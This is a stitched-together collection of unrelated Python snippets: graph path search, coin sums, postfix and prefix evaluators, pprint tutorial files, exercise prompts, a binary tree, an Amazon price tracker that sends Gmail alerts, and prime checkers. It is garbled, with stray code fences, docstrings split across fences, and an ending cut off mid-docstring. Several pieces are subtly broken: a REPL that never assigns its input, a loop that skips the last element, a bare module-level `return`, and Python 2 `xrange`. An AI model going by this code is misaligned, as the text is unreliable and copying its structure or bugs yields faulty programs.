    def raw_mode(self) -> ContextManager[None]:
        return DummyContext()

    def cooked_mode(self) -> ContextManager[None]:
        return DummyContext()

    def close(self) -> None:
        "Close pipe fds."
        os.close(self._r)
        os.close(self._w)

        # We should assign `None` to 'self._r` and 'self._w',
        # The event loop still needs to know the the fileno for this input in order
        # to properly remove it from the selectors.

    def typeahead_hash(self) -> str:
        """
        This needs to be unique for every `PipeInput`.
        """
        return "pipe-input-%s" % (self._id,)

from collections import defaultdict


def dfs(s):
    # Append the node in path
    # and set visited
    path.append(s)
    visited[s] = True

    # Path started with a node
    # having in-degree 0 and
    # current node has out-degree 0,
    # print current path
    if outdeg0[s] and indeg0[path[0]]:
        print(*path)

    # Recursive call to print all paths
    for node in adj[s]:
        if not visited[node]:
            dfs(node)

    # Remove node from path
    # and set unvisited
    path.pop()
    visited[s] = False


def csFindAllPathsFromAToB(graph):
    for i in range(graph):

        # for each node with in-degree 0
        # print all possible paths
        if indeg0[i] and adj[i]:
            path = []
            visited = [False] * (graph + 1)
            dfs(i)


# Driver code

graph = 6
# set all nodes unvisited
visited = [False] * (graph + 1)
path = []

# edges = (a, b): a -> b
edges = [(5, 0), (5, 2), (2, 3), (4, 0), (4, 1), (3, 1)]

# adjacency list for nodes
adj = defaultdict(list)

# indeg0 and outdeg0 arrays
indeg0 = [True] * graph
outdeg0 = [True] * graph

for edge in edges:
    u, v = edge[0], edge[1]
    # u -> v
    adj[u].append(v)

    # set indeg0[v] <- false
    indeg0[v] = False

    # set outdeg0[u] <- false
    outdeg0[u] = False

# print('All possible paths:')
csFindAllPathsFromAToB(graph)

import itertools

# Given an array of coins and an array of quantities for each coin with the
# same index, determine how many distinct sums can be made from non-zero
# sets of the coins

# Note: This problem took a little more working-through, with a failed brute-
# force attempt that consisted of finding every combination of coins and
# adding them, which failed when I needed to consider >50k coins
# the overall number of coins was guaranteed to be less than about 1 million,
# so the solution appeared to be a form of divide-and-conquer where each
# possible sum for each coin was put into a set at that coin's index in the
# original coins array, and then the sums were repeatedly combined into an
# aggregate set until every coin possible coin value (given by the coins
# array) had been added into the set of sums

# problem considered "hard," asked by Google


def possibleSums(coins, quantity):
    # sum_map = set()
    # start with brute force
    # total_arr = [coins[i] for i, q in enumerate(quantity) for l in range(q)]

    # for i in range(1, len(total_arr)+1):
    #     combos = itertools.combinations(total_arr, i)
    #     print(combos)
    #     for combo in combos:
    #         sum_map.add(sum(combo))

    # return len(sum_map)

    # faster?
    comb_indices = [i for i in range(len(coins))]
    possible_sums = []
    for i, c in enumerate(coins):
        this_set = set()
        for q in range(1, 1 + quantity[i]):
            this_set.add(c * q)
        possible_sums.append(this_set)
    # print(possible_sums)

    while len(possible_sums) > 1:
        possible_sums[0] = combine_sets(possible_sums[0], possible_sums[1])
        possible_sums.pop(1)

    return len(possible_sums[0])


def combine_sets(set1, set2):
    together_set = set()
    for item1 in set1:
        for item2 in set2:
            together_set.add(item1 + item2)
        together_set.add(item1)

    for item2 in set2:
        together_set.add(item2)
    return together_set
````

````py
Postfix Evaluate

When arithmetic expressions are given in the familiar infix notation 2 + 3 * 4, we need to use
parentheses to force a different evaluation order than the usual PEMDAS order determined by
precedence and associativity. Writing arithmetic expressions in postfix notation (also known as
Reverse Polish Notation) may look strange to us humans accustomed to the conventional infix
notation, but is computationally much easier to handle, since postfix notation allows any evaluation
order to be expressed without using any parentheses at all! A postfix expression is given as a list of
items that can be either individual integers or one of the strings '+', '-', '*' and '/' for the four
possible arithmetic operators. Calculate the result of the postfix expression.

Input: [2, 3, '+', 4, '*']
Output: 20
Output explanation: (2+3) * 4

Input: [1, 2, 3, 4, 5, 6, '*', '*', '*', '*', '*']
Output: 720
Output explanation: 1 * 2 * 3 * 4 * 5 * 6

=========================================
Use stack, save all numbers into the stack.
When a sign comes, pop the last 2 numbers from the stack, calculate their result and return the result into the stack.
    Time Complexity:    O(N)
    Space Complexity:   O(N)```


```py


############
# Solution #
############

from collections import deque


def postfix_evaluate(items):
    stack = deque()
    # lambda functions for all 4 operations
    operations = {
        "+": (lambda a, b: a + b),
        "-": (lambda a, b: a - b),
        "*": (lambda a, b: a * b),
        "/": (lambda a, b: 0 if (b == 0) else (a // b)),
    }

    for item in items:
        # check if the item is a sign or a number
        if item in operations:
            b = stack.pop()
            a = stack.pop()

            result = operations[item](a, b)

            stack.append(result)
        else:
            stack.append(item)

    return stack.pop()


###########
# Testing #
###########

# Test 1
# Correct result => 20
print(postfix_evaluate([2, 3, "+", 4, "*"]))

# Test 2
# Correct result => 14
print(postfix_evaluate([2, 3, 4, "*", "+"]))

# Test 3
# Correct result => 0
print(postfix_evaluate([3, 3, 3, "-", "/"]))

# Test 4
# Correct result => 2
print(postfix_evaluate([7, 3, "/"]))

# Test 5
# Correct result => 720
print(postfix_evaluate([1, 2, 3, 4, 5, 6, "*", "*", "*", "*", "*"]))
````

````py
Output:

Enter a Postfix Equation (space separated) = 5 6 9 * +
 Symbol  |    Action    | Stack
-----------------------------------
       5 | push(5)      | 5
       6 | push(6)      | 5,6
       9 | push(9)      | 5,6,9
         | pop(9)       | 5,6
         | pop(6)       | 5
       * | push(6*9)    | 5,54
         | pop(54)      | 5
         | pop(5)       |
       + | push(5+54)   | 59

        Result =  59```


```py

import operator as op


def Solve(Postfix):
    Stack = []
    Div = lambda x, y: int(x / y)  # noqa: E731 integer division operation
    Opr = {
        "^": op.pow,
        "*": op.mul,
        "/": Div,
        "+": op.add,
        "-": op.sub,
    }  # operators & their respective operation

    # print table header
    print("Symbol".center(8), "Action".center(12), "Stack", sep=" | ")
    print("-" * (30 + len(Postfix)))

    for x in Postfix:
        if x.isdigit():  # if x in digit
            Stack.append(x)  # append x to stack
            # output in tabular format
            print(x.rjust(8), ("push(" + x + ")").ljust(12), ",".join(Stack), sep=" | ")
        else:
            B = Stack.pop()  # pop stack
            # output in tabular format
            print("".rjust(8), ("pop(" + B + ")").ljust(12), ",".join(Stack), sep=" | ")

            A = Stack.pop()  # pop stack
            # output in tabular format
            print("".rjust(8), ("pop(" + A + ")").ljust(12), ",".join(Stack), sep=" | ")

            Stack.append(
                str(Opr[x](int(A), int(B)))
            )  # evaluate the 2 values popped from stack & push result to stack
            # output in tabular format
            print(
                x.rjust(8),
                ("push(" + A + x + B + ")").ljust(12),
                ",".join(Stack),
                sep=" | ",
            )

    return int(Stack[0])


if __name__ == "__main__":
    Postfix = input("\n\nEnter a Postfix Equation (space separated) = ").split(" ")
    print("\n\tResult = ", Solve(Postfix))

from item import Item

class Potion(Item):
    def __init__(self, name, power):
        Item.__init__(self, name)
        self.power = power
        self.picked_up = False
        self.consumed = False
    # on_take method sets the picked_up value to True
    def on_take(self):
        self.picked_up = True

    def on_drop(self): pass

    def on_use(self, target):
      if not self.consumed:
        print("you consumed a potion")
        target.health += self.power
        self.consumed = True
        self.name = "empty flask"
      else:
        print("this flask is empty you already drank the potion")
def actual_power(a: int, b: int):
    """
    Function using divide and conquer to calculate a^b.
    It only works for integer a,b.
    """
    if b == 0:
        return 1
    if (b % 2) == 0:
        return actual_power(a, int(b / 2)) * actual_power(a, int(b / 2))
    else:
        return a * actual_power(a, int(b / 2)) * actual_power(a, int(b / 2))


def power(a: int, b: int) -> float:
    """
    >>> power(4,6)
    4096
    >>> power(2,3)
    8
    >>> power(-2,3)
    -8
    >>> power(2,-3)
    0.125
    >>> power(-2,-3)
    -0.125
    """
    if b < 0:
        return 1 / actual_power(a, b)
    return actual_power(a, b)


if __name__ == "__main__":
    print(power(-2, -3))

def recPowerSlow(x, n):
    if n == 0:
        return 1
    if n < 0:
        return 1 / (recPowerSlow(x, -n))
    else:
        return x * recPowerSlow(x, n - 1)


print("expected output:", pow(4, 3))
print("actual output:", recPowerSlow(4, 3))
````

````py
The Power Set

The power set of a set is the set of all its subsets.
Write a function that, given a set, generates its power set.

Input: [1, 2, 3]
Output: [[], [1], [2], [3], [1, 2], [1, 3], [2, 3], [1, 2, 3]]
* You may also use a list or array to represent a set.

=========================================
Simple recursive combinations algorithm.
    Time Complexity:    O(Sum(C(I, N)))     , sum of all combinations between 0 and N = C(0, N) + C(1, N) + ... + C(N, N)
    Space Complexity:   O(Sum(C(I, N)))     , this is for the result array, if we print the number then the space complexity will be O(N) (because of the recursive stack)```


```py


############
# Solution #
############


def power_set(arr):
    result = []
    combinations(result, arr, [], 0)
    return result


# result, arr and taken are the same references always
def combinations(result, arr, taken, pos):
    result.append([arr[i] for i in taken])  # create the current combination

    n = len(arr)
    if n == pos:
        return

    # start from the last position (don't need duplicates)
    for i in range(pos, n):
        taken.append(i)
        combinations(result, arr, taken, i + 1)
        del taken[-1]  # return to the old state


###########
# Testing #
###########

# Test 1
# Correct result => [[], [1], [1, 2], [2]]
print(power_set([1, 2]))

# Test 2
# Correct result => [[], [1], [1, 2], [1, 2, 3], [1, 3], [2], [2, 3], [3]]
print(power_set([1, 2, 3]))
````

````py
== Raise base to the power of exponent using recursion ==
    Input -->
        Enter the base: 3
        Enter the exponent: 4
    Output  -->
        3 to the power of 4 is 81
    Input -->
        Enter the base: 2
        Enter the exponent: 0
    Output -->
        2 to the power of 0 is 1```


```py


def power(base: int, exponent: int) -> float:
    """
    power(3, 4)
    81
    >>> power(2, 0)
    1
    >>> all(power(base, exponent) == pow(base, exponent)
    ...     for base in range(-10, 10) for exponent in range(10))
    True
    """
    return base * power(base, (exponent - 1)) if exponent else 1


if __name__ == "__main__":
    print("Raise base to the power of exponent using recursion...")
    base = int(input("Enter the base: ").strip())
    exponent = int(input("Enter the exponent: ").strip())
    result = power(base, abs(exponent))
    if exponent < 0:  # power() does not properly deal w/ negative exponents
        result = 1 / result
    print(f"{base} to the power of {exponent} is {result}")

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyPretty printing an arbitrary object.```


```py

#end_pymotw_header
from pprint import pprint


class node:

    def __init__(self, name, contents=[]):
        self.name = name
        self.contents = contents[:]

    def __repr__(self):
        return (
            'node(' + repr(self.name) + ', ' +
            repr(self.contents) + ')'
        )


trees = [
    node('node-1'),
    node('node-2', [node('node-2-1')]),
    node('node-3', [node('node-3-1')]),
]
pprint(trees)

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyPretty print with pprint```


```py

#end_pymotw_header
from pprint import pprint

from pprint_data import data

print('DEFAULT:')
pprint(data, compact=False)
print('\nCOMPACT:')
pprint(data, compact=True)

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyDefine basic data structure used in pprint examples.```


```py

#end_pymotw_header
data = [
    (1, {'a': 'A', 'b': 'B', 'c': 'C', 'd': 'D'}),
    (2, {'e': 'E', 'f': 'F', 'g': 'G', 'h': 'H',
         'i': 'I', 'j': 'J', 'k': 'K', 'l': 'L'}),
    (3, ['m', 'n']),
    (4, ['o', 'p', 'q']),
    (5, ['r', 's', 't''u', 'v', 'x', 'y', 'z']),
]

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyPretty print with pprint```


```py

#end_pymotw_header
from pprint import pprint

from pprint_data import data

pprint(data, depth=1)
pprint(data, depth=2)

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyFormatting with pformat```


```py

#end_pymotw_header
import logging
from pprint import pformat
from pprint_data import data

logging.basicConfig(
    level=logging.DEBUG,
    format='%(levelname)-8s %(message)s',
)

logging.debug('Logging pformatted data')
formatted = pformat(data)
for line in formatted.splitlines():
    logging.debug(line.rstrip())

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyPretty print with pprint```


```py

#end_pymotw_header
from pprint import pprint

from pprint_data import data

print('PRINT:')
print(data)
print()
print('PPRINT:')
pprint(data)

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyHandling recursive data structures.```


```py

#end_pymotw_header
from pprint import pprint

local_data = ['a', 'b', 1, 2]
local_data.append(local_data)

print('id(local_data) =>', id(local_data))
pprint(local_data)

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyPretty print with pprint```


```py

#end_pymotw_header
from pprint import pprint

from pprint_data import data

for width in [80, 5]:
    print('WIDTH =', width)
    pprint(data, width=width)
    print()

cmd = ""
while cmd != "exit":
    cmd == input(">>")
    if cmd == "hello" or cmd == "hi":
        print("hello")
    elif cmd == "goodbye":
        print("did you mean to exit?")
    elif cmd == "exit":
        print("Thanks for using repl")
    else:
        print("I did not understand the command")

# Create a program that asks the user to enter their name and their age.
# Print out a message addressed to them
# that tells them the year that they will turn 100 years old.

# -*- coding: utf-8 -*-```


```py

````

````py


def fibonacci(n):
    print("1, 1, ", end="")
    count = 2
    first_num = 1
    sec_num = 1
    while count < n:
        sum = first_num + sec_num
        print(sum, end=", ")
        first_num = sec_num
        sec_num = sum
        count += 1


n = int(input("Enter the number of fibonacci number you want to generate: "))

fibonacci(n)

# Problem 11
# Here's your coding interview problem for today.
# This problem was asked by Google.
# In linear algebra, a Toeplitz matrix is one in which the elements on any given diagonal from top left to bottom right are identical.
# Here is an example:
# 1 2 3 4 8
# 5 1 2 3 4
# 4 5 1 2 3
# 7 4 5 1 2
# Write a program to determine whether a given input is a Toeplitz matrix.

# Problem 12
# Here's your coding interview problem for today.
# This problem was asked by PagerDuty.
# Given a positive integer N, find the smallest number of steps it will take to reach 1.
# There are two kinds of permitted steps:
#  - -> You may decrement N to N - 1.
#  - -> If a * b = N, you may decrement N to the larger of a and b.
# For example, given 100, you can reach 1 in 5 steps with the following route:
# 100 -> 10 -> 9 -> 3 -> 2 -> 1.

# -*- coding: utf-8 -*-```


```py

````

````py
import sys


def assignHoles(mice, holes):
    max = -sys.maxsize

    if len(mice) != len(holes):
        return -1
    else:
        mice.sort()
        holes.sort()

        for i in range(0, len(mice) - 1):
            if max < abs(mice[i] - holes[i]):
                max = abs(mice[i] - holes[i])
        return max


# testing
assert assignHoles(mice=[1, 4, 9, 15], holes=[10, -5, 0, 16]) == 6

# Problem 2
# Ask the user for a number. Depending on whether the number is even or odd, print out an appropriate message to the user.
# Extras:
# If the number is a multiple of 4, print out a different message.
# Ask the user for two numbers: one number to check (call it num) and one number to divide by (check). If check divides evenly into num, tell that to the user. If not, print a different appropriate message.

# -*- coding: utf-8 -*-```


```py

````

````py

input_list = input("Enter a list of numbers: ")
list = input_list.split()  # separting the elements by spaces in the list

for x in list:
    if int(x) < 5:
        print(x)

print([x for x in list if int(x) < 5])

num = int(input("Enter a number: "))
print([x for x in list if int(x) < num])

# -*- coding: utf-8 -*-```


```py

````

````py

num = int(input("Enter a number: "))

# if the elements in the range(2, num) evenly divides the num,
# then it is included in the divisors list
divisor = [x for x in range(2, num) if num % x == 0]

for x in divisor:
    print(x)

# Problem 5
# Take two lists, and write a program that returns a list that contains only the elements that are common between the lists (without duplicates). Make sure your program works on two lists of different sizes.
# Bonus:
# Randomly generate two lists to test this.
# Write this in one line of Python.

# Problem 6
# Ask the user for a string and print out whether this string is a palindrome or not. (A palindrome is a string that reads the same forwards and backwards.)

# -*- coding: utf-8 -*-```


```py

````

````py

input_str = input("Enter a list of elements: ")

list1 = [int(x) for x in input_str.split() if int(x) % 2 == 0]

print(list1)

# Problem 8
# Make a two-player Rock-Paper-Scissors game.
# Hint:
# Ask for player plays (using input), compare them. Print out a message of congratulations to the winner, and ask if the players want to start a new game.
# Remember the rules:
# rock beats scissors
# scissors beats paper
# paper beats rock

# Problem 9
# Generate a random number between 1 and 100 (including 1 and 100). Ask the user to guess the number, then tell them whether they guessed too low, too high, or exactly right.
# Hint:
# Remember to use the user input lessons from the very first exercise.
# Extras:
# Keep the game going until the user types "exit".
# Keep track of how many guesses the user has taken, and when the game ends, print this out.

# -*- coding: utf-8 -*-```


```pyNbconvert preprocessor for the python-markdown nbextension."""

import re

from nbconvert.preprocessors import Preprocessor


class PyMarkdownPreprocessor(Preprocessor):
    """
    :mod:`nbconvert` Preprocessor for the python-markdown nbextension.

    This :class:`~nbconvert.preprocessors.Preprocessor` replaces kernel code in
    markdown cells with the results stored in the cell metadata.
    """

    def replace_variables(self, source, variables):
        """
        Replace {{variablename}} with stored value
        """
        try:
            replaced = re.sub(
                "{{(.*?)}}", lambda m: variables.get(m.group(1), ''), source)
        except TypeError:
            replaced = source
        return replaced

    def preprocess_cell(self, cell, resources, index):
        """
        Preprocess cell

        Parameters
        ----------
        cell : NotebookNode cell
            Notebook cell being processed
        resources : dictionary
            Additional resources used in the conversion process.  Allows
            preprocessors to pass variables into the Jinja engine.
        cell_index : int
            Index of the cell being processed (see base.py)
        """
        if cell.cell_type == "markdown":
            if hasattr(cell['metadata'], 'variables'):
                variables = cell['metadata']['variables']
                if len(variables) > 0:
                    cell.source = self.replace_variables(
                        cell.source, variables)
        return cell, resources

import re
from codecs import BOM_UTF8
from typing import Tuple

from parso.python.tokenize import group

unicode_bom = BOM_UTF8.decode('utf-8')


class PrefixPart:
    def __init__(self, leaf, typ, value, spacing='', start_pos=None):
        assert start_pos is not None
        self.parent = leaf
        self.type = typ
        self.value = value
        self.spacing = spacing
        self.start_pos: Tuple[int, int] = start_pos

    @property
    def end_pos(self) -> Tuple[int, int]:
        if self.value.endswith('\n'):
            return self.start_pos[0] + 1, 0
        if self.value == unicode_bom:
            # The bom doesn't have a length at the start of a Python file.
            return self.start_pos
        return self.start_pos[0], self.start_pos[1] + len(self.value)

    def create_spacing_part(self):
        column = self.start_pos[1] - len(self.spacing)
        return PrefixPart(
            self.parent, 'spacing', self.spacing,
            start_pos=(self.start_pos[0], column)
        )

    def __repr__(self):
        return '%s(%s, %s, %s)' % (
            self.__class__.__name__,
            self.type,
            repr(self.value),
            self.start_pos
        )


_comment = r'#[^\n\r\f]*'
_backslash = r'\\\r?\n'
_newline = r'\r?\n'
_form_feed = r'\f'
_only_spacing = '$'
_spacing = r'[ \t]*'
_bom = unicode_bom

_regex = group(
    _comment, _backslash, _newline, _form_feed, _only_spacing, _bom,
    capture=True
)
_regex = re.compile(group(_spacing, capture=True) + _regex)


_types = {
    '#': 'comment',
    '\\': 'backslash',
    '\f': 'formfeed',
    '\n': 'newline',
    '\r': 'newline',
    unicode_bom: 'bom'
}


def split_prefix(leaf, start_pos):
    line, column = start_pos
    start = 0
    value = spacing = ''
    bom = False
    while start != len(leaf.prefix):
        match = _regex.match(leaf.prefix, start)
        spacing = match.group(1)
        value = match.group(2)
        if not value:
            break
        type_ = _types[value[0]]
        yield PrefixPart(
            leaf, type_, value, spacing,
            start_pos=(line, column + start - int(bom) + len(spacing))
        )
        if type_ == 'bom':
            bom = True

        start = match.end(0)
        if value.endswith('\n'):
            line += 1
            column = -start

    if value:
        spacing = ''
    yield PrefixPart(
        leaf, 'spacing', spacing,
        start_pos=(line, column + start)
    )
````

````py
Convert International System of Units (SI) and Binary prefixes```


```py
from enum import Enum
from typing import Union


class SI_Unit(Enum):
    yotta = 24
    zetta = 21
    exa = 18
    peta = 15
    tera = 12
    giga = 9
    mega = 6
    kilo = 3
    hecto = 2
    deca = 1
    deci = -1
    centi = -2
    milli = -3
    micro = -6
    nano = -9
    pico = -12
    femto = -15
    atto = -18
    zepto = -21
    yocto = -24


class Binary_Unit(Enum):
    yotta = 8
    zetta = 7
    exa = 6
    peta = 5
    tera = 4
    giga = 3
    mega = 2
    kilo = 1


def convert_si_prefix(
    known_amount: float,
    known_prefix: Union[str, SI_Unit],
    unknown_prefix: Union[str, SI_Unit],
) -> float:
    """
    Wikipedia reference: https://en.wikipedia.org/wiki/Binary_prefix
    Wikipedia reference: https://en.wikipedia.org/wiki/International_System_of_Units
    >>> convert_si_prefix(1, SI_Unit.giga, SI_Unit.mega)
    1000
    >>> convert_si_prefix(1, SI_Unit.mega, SI_Unit.giga)
    0.001
    >>> convert_si_prefix(1, SI_Unit.kilo, SI_Unit.kilo)
    1
    >>> convert_si_prefix(1, 'giga', 'mega')
    1000
    >>> convert_si_prefix(1, 'gIGa', 'mEGa')
    1000
    """
    if isinstance(known_prefix, str):
        known_prefix = SI_Unit[known_prefix.lower()]
    if isinstance(unknown_prefix, str):
        unknown_prefix = SI_Unit[unknown_prefix.lower()]
    unknown_amount: float = known_amount * (
        10 ** (known_prefix.value - unknown_prefix.value)
    )
    return unknown_amount


def convert_binary_prefix(
    known_amount: float,
    known_prefix: Union[str, Binary_Unit],
    unknown_prefix: Union[str, Binary_Unit],
) -> float:
    """
    Wikipedia reference: https://en.wikipedia.org/wiki/Metric_prefix
    >>> convert_binary_prefix(1, Binary_Unit.giga, Binary_Unit.mega)
    1024
    >>> convert_binary_prefix(1, Binary_Unit.mega, Binary_Unit.giga)
    0.0009765625
    >>> convert_binary_prefix(1, Binary_Unit.kilo, Binary_Unit.kilo)
    1
    >>> convert_binary_prefix(1, 'giga', 'mega')
    1024
    >>> convert_binary_prefix(1, 'gIGa', 'mEGa')
    1024
    """
    if isinstance(known_prefix, str):
        known_prefix = Binary_Unit[known_prefix.lower()]
    if isinstance(unknown_prefix, str):
        unknown_prefix = Binary_Unit[unknown_prefix.lower()]
    unknown_amount: float = known_amount * (
        2 ** ((known_prefix.value - unknown_prefix.value) * 10)
    )
    return unknown_amount


if __name__ == "__main__":
    import doctest

    doctest.testmod()
````

````py
Python3 program to evaluate a prefix expression.```


```py

calc = {
    "+": lambda x, y: x + y,
    "-": lambda x, y: x - y,
    "*": lambda x, y: x * y,
    "/": lambda x, y: x / y,
}


def is_operand(c):
    """
    Return True if the given char c is an operand, e.g. it is a number

    >>> is_operand("1")
    True
    >>> is_operand("+")
    False
    """
    return c.isdigit()


def evaluate(expression):
    """
    Evaluate a given expression in prefix notation.
    Asserts that the given expression is valid.

    >>> evaluate("+ 9 * 2 6")
    21
    >>> evaluate("/ * 10 2 + 4 1 ")
    4.0
    """
    stack = []

    # iterate over the string in reverse order
    for c in expression.split()[::-1]:

        # push operand to stack
        if is_operand(c):
            stack.append(int(c))

        else:
            # pop values from stack can calculate the result
            # push the result onto the stack again
            o1 = stack.pop()
            o2 = stack.pop()
            stack.append(calc[c](o1, o2))

    return stack.pop()


# Driver code
if __name__ == "__main__":
    test_expression = "+ 9 * 2 6"
    print(evaluate(test_expression))

    test_expression = "/ * 10 2 + 4 1 "
    print(evaluate(test_expression))
````

````py
https://cp-algorithms.com/string/prefix-function.html

Prefix function Knuth–Morris–Pratt algorithm

Different algorithm than Knuth-Morris-Pratt pattern finding

E.x. Finding longest prefix which is also suffix

Time Complexity: O(n) - where n is the length of the string```


```py


def prefix_function(input_string: str) -> list:
    """
    For the given string this function computes value for each index(i),
    which represents the longest coincidence of prefix and sufix
    for given substring (input_str[0...i])

    For the value of the first element the algorithm always returns 0

    >>> prefix_function("aabcdaabc")
    [0, 1, 0, 0, 0, 1, 2, 3, 4]
    >>> prefix_function("asdasdad")
    [0, 0, 0, 1, 2, 3, 4, 0]
    """

    # list for the result values
    prefix_result = [0] * len(input_string)

    for i in range(1, len(input_string)):

        # use last results for better performance - dynamic programming
        j = prefix_result[i - 1]
        while j > 0 and input_string[i] != input_string[j]:
            j = prefix_result[j - 1]

        if input_string[i] == input_string[j]:
            j += 1
        prefix_result[i] = j

    return prefix_result


def longest_prefix(input_str: str) -> int:
    """
    Prefix-function use case
    Finding longest prefix which is sufix as well

    >>> longest_prefix("aabcdaabc")
    4
    >>> longest_prefix("asdasdad")
    4
    >>> longest_prefix("abcab")
    2
    """

    # just returning maximum value of the array gives us answer
    return max(prefix_function(input_str))


if __name__ == "__main__":
    import doctest

    doctest.testmod()

class Node(object):
    def __init__(self, value):
        self.value = value
        self.left = None
        self.right = None


class BinaryTree(object):
    def __init__(self, root):
        self.root = Node(root)

    def preorder_search(self, start, find_val):
        """Helper method - use this to create a
        recursive search solution."""
        if start.value == find_val:
            return True
        if start.left != None:
            left_result = self.preorder_search(start.left, find_val)
        else:
            left_result = False
        if start.right != None and left_result != True:
            right_result = self.preorder_search(start.right, find_val)
        else:
            right_result = False

        if left_result == True or right_result == True:
            return True
        else:
            return False

    def preorder_print(self, start, traversal):
        """Helper method - use this to create a
        recursive print solution."""
        traversal += "-" + str(start.value)
        left_nums = ""
        right_nums = ""
        if start.left != None:
            traversal = self.preorder_print(start.left, traversal)
        if start.right != None:
            traversal = self.preorder_print(start.right, traversal)
        return traversal

    def search(self, find_val):
        """Return True if the value
        is in the tree, return
        False otherwise."""
        return self.preorder_search(self.root, find_val)
        # print(self.preorder_search(self.root, find_val))

    def print_tree(self):
        """Print out all tree nodes
        as they are visited in
        a pre-order traversal."""
        all_nodes = self.preorder_print(self.root, "")
        all_nodes = all_nodes[1:]
        return all_nodes


# Set up tree
tree = BinaryTree(1)
tree.root.left = Node(2)
tree.root.right = Node(3)
tree.root.left.left = Node(4)
tree.root.left.right = Node(5)

# Test search
# Should be True
print(tree.search(4))
# Should be False
print(tree.search(6))

# Test print_tree
# Should be 1-2-4-5-3
print(tree.print_tree())

import itertools as i

# *re.findall('...', 'abcdefghijklmno')
# >>> 'abc', 'def', 'ghi', 'jkl', 'mno'

#  [0,0,"abc","def","ghi","jkl","mno","pqrs","tuv","wxyz"]
return [
    "".join(s)
    for s in i.product(
        *[
            "0 0 abc def ghi jkl mno pqrs tuv wxyz".split()[int(i)]
            for i in eval(dir()[0])[0]
        ]
    )
    if s
]

try:
    import requests
    from bs4 import BeautifulSoup
    import smtplib
    import re

except ImportError:
    print('Some modules are not installed! ')
    print("try\t\tpip install requests bs4 smtplib")

global URL


# enable "allow less secured apps" on your gmail for recieving emails
def send_mail(URL, sender_email, password, recievers_email, Price):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    # The client sends this command to the SMTP server to identify itself and initiate the SMTP conversation.
    server.ehlo()
    server.starttls()  # encrypts the connnection

    server.login(sender_email, password)
    subject = 'Price fell down!'
    body = 'Check the amazon link ' + URL
    msg = f"Subject: {subject}\n\n{body}"
    server.sendmail(sender_email, recievers_email, msg)

    print('email has been sent')
    server.quit()


def information(soup, URL, sender_email, password, recievers_email, Price):

    title = soup.find(id="productTitle").getText().strip()
    print("\nProduct\t:\n\t", title, "\n")
    # price1 = soup.find(id="priceblock_ourprice").getText()
    price = soup.find(id="priceblock_ourprice").get_text().replace(
        ',', '').replace('₹', '').replace(' ', '').strip()
    print("Current price\t:\t", price)
    # print(price)
    # using regex to convert into float so we can compare with expected price
    #
    print("Price you expect\t:\t", Price)
    if (float(price) < float(Price)):
        print("YEAH price has fallen!! email will be sent")
        send_mail(URL, sender_email, password, recievers_email, Price)
    else:
        print("seems like you have to wait -) ")


def entry():
    # URL = "https://www.amazon.in/ASUS-i9-10980HK-Graphics-Windows-G532LWS-HF079T/dp/B08HX42DGG/ref=sr_1_1?crid=MM0GWK65DAA4&dchild=1&keywords=asus+rog+32gb+ram+laptop&qid=1609939236&sprefix=rog+32gb+ram+%2Caps%2C494&sr=8-1"

    URL = input("[+] paste the url of the amazon product\t>>\t").strip()
    Headers = input(
        "\n[+]just type --my user agent -- in your browser and paste the result \nexampe\n'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36\t>>\t"
    ).strip()
    headers = {"User-Agent": Headers}
    Price1 = input("[+] price you expect\t>>\t").strip()
    sender_email = input(
        "\n[+] An email will be sent from this  account(enable allow secured apps on your account)\t>>\t"
    ).strip()
    password = input("\n[+] your password\t>>\t").strip()
    recievers_email = input(
        "\n[+]  email will be recievedd on this account\t>>\t").strip()
    page = requests.get(URL, headers=headers)

    soup = BeautifulSoup(page.content, 'html.parser')
    Price = Price1.replace(',', '').replace(' ', '').strip()

    # print(soup.prettify)
    try:
        print(
            "# enable --allow less secured apps-- on your gmail if you want to recieve a email"
        )
        information(soup, URL, sender_email, password, recievers_email, Price)
    except AttributeError:
        print("product info not found")


if __name__ == "__main__":
    entry()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

Prime numbers.```


```py
from math import sqrt
from bisect import bisect_left as bisect
from itertools import count


__primes = [
    2,
    3,
    5,
    7,
    11,
    13,
    17,
    19,
    23,
    29,
    31,
    37,
    41,
    43,
    47,
    53,
    59,
    61,
    67,
    71,
    73,
    79,
    83,
    89,
    97,
]


def nth_prime(n):
    global __primes
    if not __primes:
        __primes = [2]

    if n <= len(__primes):
        return __primes[n - 1]

    i = __primes[-1]
    limit = 1 + bisect(__primes, int(sqrt(i)))
    while len(__primes) < n:
        i += 2
        while __primes[limit] ** 2 <= i:
            limit += 1
        if all(i % p for p in __primes[1:limit]):
            __primes.append(i)
    return __primes[-1]


def known_prime(n):
    if n <= __primes[-1]:
        i = bisect(__primes, n)
        return __primes[i] == n
    return False


def is_prime(n):
    n = abs(n)
    if n < 2:
        return False
    elif known_prime(n):
        return True
    else:
        return all(n % p for p in primes_upto(n))


def all_primes():
    for n in count(1):
        yield nth_prime(n)


def primes_upto(m):
    for p in all_primes():
        if p < m:
            yield p
        else:
            break

from math import sqrt


def is_prime(n):
    if n <= 1:
        return False
    elif n == 2:
        return True
    elif n % 2 == 0:
        return False
    for i in xrange(3, int(sqrt(n)) + 1, 2):
        if n % i == 0:
            return False
    return True

def isPrime(n):
    for i in range(2, n):
        if n % i == 0:
            return False
            break
    return True


n = 10
for j in range(2, n):
    if isPrime(j):
        print(j)

# Prime number Determiner
# replace input() with raw_input() in Python version 2.7 input() works with version 3
import math as Math

POSITIVE_MESSAGE = " is a prime number"
NEGATIVE_MESSAGE = " is not a prime number"


def is_number_prime(number):
    """
    Function which checks whether the number is a prime number or not
    :param number: integer - to be checked for prime-ness
    :return: boolean - true if prime, else false
    """

    """
    This is the main logic behind reducing the numbers to check for as factors
